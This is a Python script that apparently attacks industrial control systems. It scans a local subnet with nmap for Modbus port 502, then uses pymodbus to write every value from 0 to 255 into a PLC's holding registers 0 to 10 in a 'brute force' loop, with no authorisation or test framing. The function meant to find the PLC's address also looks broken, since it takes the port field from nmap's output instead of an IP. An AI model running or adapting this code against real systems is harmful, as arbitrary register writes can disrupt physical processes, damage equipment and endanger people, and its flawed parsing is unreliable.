import subprocess
import pymodbus
from pymodbus.client import ModbusTcpClient
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # Use nmap to scan the network for devices
    nmap_output = subprocess.check_output(['nmap', '-p', '502', '--open', '192.168.1.0/24']).decode('utf-8')
    lines = nmap_output.split('\n')
    
    for line in lines:
        if "502/tcp open" in line:
            ip = line.split()[0]
            return ip
    
    return None

# Function to brute force I/O point values
def brute_force_io(plc_ip, start_address, end_address, step, delay):
    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    try:
        for address in range(start_address, end_address + 1, step):
            for value in range(0, 256):  # Example range of values to brute force
                result = client.write_register(address, value)
                if result.isError():
                    print(f"Failed to write to address {address} with value {value}")
                else:
                    print(f"Successfully wrote {value} to address {address}")
                time.sleep(delay)
    finally:
        client.close()

# Main function
def main():
    plc_ip = find_plc_ip()
    
    if plc_ip is None:
        print("PLC not found on the network.")
        return
    
    print(f"PLC found at IP address: {plc_ip}")
    
    # Define the range of I/O points to brute force
    start_address = 0
    end_address = 10
    step = 1
    delay = 0.1  # Delay between writes in seconds
    
    brute_force_io(plc_ip, start_address, end_address, step, delay)

if __name__ == "__main__":
    main()